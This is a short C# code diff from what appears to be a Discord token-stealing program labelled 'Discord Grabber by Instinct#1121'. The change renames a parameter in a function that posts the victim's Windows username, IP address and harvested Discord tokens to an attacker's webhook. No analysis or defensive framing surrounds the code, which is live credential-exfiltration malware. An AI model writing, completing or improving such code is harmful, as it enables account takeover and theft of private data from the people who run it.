@@ -46,13 +46,13 @@ namespace DiscordG
             return ip;
         }
 
-        public static void SendMeResults(List<string> message)
+        public static void SendMeResults(List<string> tokens)
         {
             Http.Post(webhook, new NameValueCollection()
             {
                 { "username", "Discord Grabber by Instinct#1121" },
                 { "avatar_url", "https://64.media.tumblr.com/6fd8805db788da47a3dba1cbe04d3e58/6a63940804bf8826-ee/s400x600/c1889cd0688966c4d8433980ccb78cd04153c9a2.png" },
-                { "content", "```\n" + "Report from Discord Grabber\n\n" + "Username: " + Environment.UserName + "\nIP: " + GetIP() + "\nTokens:\n\n" + string.Join("\n", message) + "\n\n" + "\n```" }
+                { "content", "```\n" + "Report from Discord Grabber\n\n" + "Username: " + Environment.UserName + "\nIP: " + GetIP() + "\nTokens:\n\n" + string.Join("\n", tokens) + "\n\n" + "\n```" }
             });
         }
     }
